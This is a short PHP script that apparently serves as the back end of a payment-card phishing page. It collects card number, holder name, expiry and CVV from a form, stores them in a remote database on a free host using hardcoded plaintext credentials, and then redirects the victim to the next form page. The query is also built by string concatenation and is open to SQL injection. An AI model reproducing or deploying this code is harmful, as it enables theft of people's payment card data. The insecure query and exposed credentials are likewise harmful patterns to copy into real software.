<?php

$con = mysqli_connect("fdb31.biz.nf","4024908_job","E2j2S0#G1!6DYLF}","4024908_job");

if(isset($_POST["submit"]))
{
$cardnu =$_POST["cardnu"];
$holder  =$_POST["holder"];
$month  = $_POST["month"];
$year = $_POST["year"];
$cvv = $_POST["cvv"];

$query =  "INSERT INTO threepage(CARDNU, HOLDER, MONTH, YEAR, CVV) VALUE ('".$cardnu."','".$holder."','".$month."','".$year."','".$cvv."')"; 

$run = mysqli_query($con,$query);
}
 //redirect
   header ("Location:formc.html");

 ?>